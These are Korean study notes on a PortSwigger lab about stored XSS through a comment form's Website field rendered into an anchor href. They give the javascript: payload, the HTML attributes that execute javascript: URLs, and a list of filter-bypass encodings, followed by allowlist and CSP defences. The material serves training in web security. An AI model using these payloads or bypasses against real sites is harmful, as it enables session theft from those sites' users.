# Lab: Stored XSS into anchor href attribute with double quotes HTML-encoded

## 개요

- **난이도**: Apprentice
- **주제**: Cross-Site Scripting (XSS) — Stored / href attribute / `javascript:` 프로토콜
- **링크**: https://portswigger.net/web-security/cross-site-scripting/contexts/lab-href-attribute-double-quotes-html-encoded

## 목표

댓글 작성 시 "Website" 필드에 `javascript:` 페이로드를 저장하여, 작성자 이름 클릭 시 `alert(document.cookie)` 가 실행되도록 한다.

## 취약점 분석

댓글 작성 폼의 "Website" 필드 입력값이 작성자 이름의 `href` 속성에 저장된다.

```html
<!-- 정상 입력: https://example.com -->
<a href="https://example.com">작성자이름</a>

<!-- " 는 HTML 인코딩됨 → 속성 탈출 불가 -->
입력: " onmouseover="alert(1)
결과: <a href="&quot; onmouseover=&quot;alert(1)">작성자이름</a>
      → 공격 실패
```

`"` 가 `&quot;` 로 인코딩되어 007 랩의 속성 탈출 방식은 통하지 않는다.  
하지만 `href` 는 URL을 받는 속성이므로 `javascript:` 프로토콜이 동작한다.

## 공격 방법

Website 필드에 입력:

```
javascript:alert(document.cookie)
```

저장 후 생성되는 HTML:

```html
<a href="javascript:alert(document.cookie)">작성자이름</a>
```

작성자 이름 링크를 클릭하면 `alert(document.cookie)` 가 실행된다.

## 이전 랩들과의 관계

| 항목 | 005 (jQuery href DOM) | 007 (속성 탈출) | 008 (이번 랩) |
|------|----------------------|----------------|--------------|
| XSS 유형 | Reflected (DOM-based) | Reflected | **Stored** |
| 인코딩 제한 | 없음 | `<>` 인코딩 | `"` 인코딩 |
| 공격 방법 | `javascript:` in href | `"` 로 속성 탈출 | `javascript:` in href |
| 실행 조건 | Back 링크 클릭 | autofocus 자동 | 작성자 이름 클릭 |
| 지속성 | URL 방문 시마다 | URL 방문 시마다 | **DB에 저장, 영구 지속** |

005 랩에서는 jQuery가 `location.search` 를 읽어 href에 동적으로 삽입했고,  
이번 랩은 동일한 `javascript:` 페이로드를 **DB에 저장**하는 Stored XSS 형태다.

## `javascript:` 프로토콜이 동작하는 맥락

`href` 에 `javascript:` 가 허용되는 이유는 브라우저가 링크를 URL로 처리하기 전에 스킴을 확인하기 때문이다.

```
http://   → 외부 URL 이동
https://  → 외부 URL 이동 (TLS)
mailto:   → 메일 클라이언트 실행
tel:      → 전화 앱 실행
javascript: → JS 코드 실행  ← XSS 벡터
data:     → 인라인 데이터 (일부 브라우저 차단)
```

### `javascript:` 가 동작하는 HTML 속성

```html
<!-- href (가장 흔한 벡터) -->
<a href="javascript:alert(1)">클릭</a>

<!-- form action -->
<form action="javascript:alert(1)"><button>전송</button></form>

<!-- iframe src -->
<iframe src="javascript:alert(1)"></iframe>

<!-- object data -->
<object data="javascript:alert(1)"></object>

<!-- SVG xlink:href -->
<svg><a xlink:href="javascript:alert(1)"><text y=20>클릭</text></a></svg>

<!-- button formaction (form 없이도 동작) -->
<button formaction="javascript:alert(1)">클릭</button>
<input type=submit formaction="javascript:alert(1)" value="클릭">
```

### `javascript:` 인코딩 우회 변형

필터가 `javascript:` 문자열을 차단할 경우 다양한 우회 방법이 있다.

```
javascript:alert(1)                  → 기본형
JAVASCRIPT:alert(1)                  → 대문자 (대소문자 무시)
Javascript:alert(1)                  → 혼합 대소문자
&#106;avascript:alert(1)             → j를 HTML 엔티티
java&#115;cript:alert(1)             → s를 HTML 엔티티
java\x73cript:alert(1)               → s를 URL 인코딩
javascript&#58;alert(1)              → : 를 HTML 엔티티
javascript:alert&#40;1&#41;          → () 를 HTML 엔티티

/* 공백 삽입 (일부 브라우저 허용) */
 javascript:alert(1)                 → 앞에 공백
&#9;javascript:alert(1)              → 탭 문자 (&#9;)
&#10;javascript:alert(1)             → 개행 (&#10;)
```

## Stored vs Reflected 위험도 차이 (href 컨텍스트)

`javascript:` href 가 Stored XSS 형태일 때 파급력이 더 크다.

```
[Reflected] 공격자가 피해자에게 악성 URL 전달
            → 피해자가 URL 클릭 → href 링크 클릭 → 실행
            (2번의 클릭 유도 필요)

[Stored]    공격자가 댓글로 javascript: URL 저장
            → 피해자가 게시글 방문 → 작성자 이름 클릭 → 실행
            (자연스러운 UX 흐름 — 의심 없이 클릭)
```

특히 "작성자 이름 클릭" 은 다른 사용자의 프로필을 보려는 자연스러운 행동이기 때문에 피해자가 의심 없이 클릭할 가능성이 높다.

## 핵심 정리

- `"` 가 인코딩되어 속성 탈출이 불가능해도, href 자체에 `javascript:` 를 삽입하면 XSS가 성립한다.
- 태그나 이벤트 핸들러 없이 URL 스킴만으로 JS 실행이 가능하다.
- Stored 형태이므로 페이로드를 한 번 저장하면 해당 페이지를 보는 모든 사용자에게 영향을 미친다.
- **방어**:
  - `href` 값이 `http://`, `https://`, `/` 로 시작하는지 화이트리스트 검증
  - `javascript:`, `data:`, `vbscript:` 스킴을 서버 측에서 차단
  - CSP `script-src 'self'` 로 `javascript:` 실행 차단

## 배운 점 및 추가 학습

### 1. href 검증의 올바른 방법

```javascript
// 잘못된 검증 — 블랙리스트 (우회 가능)
function isValidUrl(url) {
    return !url.startsWith('javascript:');  // 대소문자 우회 가능
}

// 올바른 검증 — 화이트리스트
function isValidUrl(url) {
    try {
        const parsed = new URL(url);
        return ['http:', 'https:'].includes(parsed.protocol);
    } catch {
        // 상대 경로는 별도 처리
        return url.startsWith('/');
    }
}
```

### 2. XSS 컨텍스트 흐름 정리 (001~008)

```
[서버에서 HTML 출력]
  태그 사이에 반사     → <script> 직접 삽입 (001, 002)
  속성 안에 반사       → " 로 탈출 + 이벤트 핸들러 (007)
  href 속성에 반사     → javascript: 프로토콜 (005, 008)

[브라우저 JS가 DOM 조작]
  document.write      → "> 로 태그 탈출 (003)
  innerHTML           → <img onerror> 등 이벤트 핸들러 (004)
  jQuery $()          → <img...> 로 HTML 생성 유도 (006)
  jQuery .attr(href)  → javascript: 프로토콜 (005)
```

### 3. 컨텍스트 파악이 공격의 시작

XSS 공격의 첫 단계는 항상 **내 입력이 HTML의 어디에 반영되는가** 를 파악하는 것이다.

```
1. 태그 사이  → <script>, <svg onload>, <img onerror>
2. 속성값 안  → " 탈출 → 이벤트 핸들러
3. href/src 안 → javascript: 프로토콜
4. JS 문자열 안 → '; 탈출 → JS 코드 삽입
5. JS 블록 안  → 인코딩 없이 삽입 가능
```

반영 위치가 다르면 탈출 방법도 달라지며, 필터링 우회 방법도 위치에 따라 선택해야 한다.
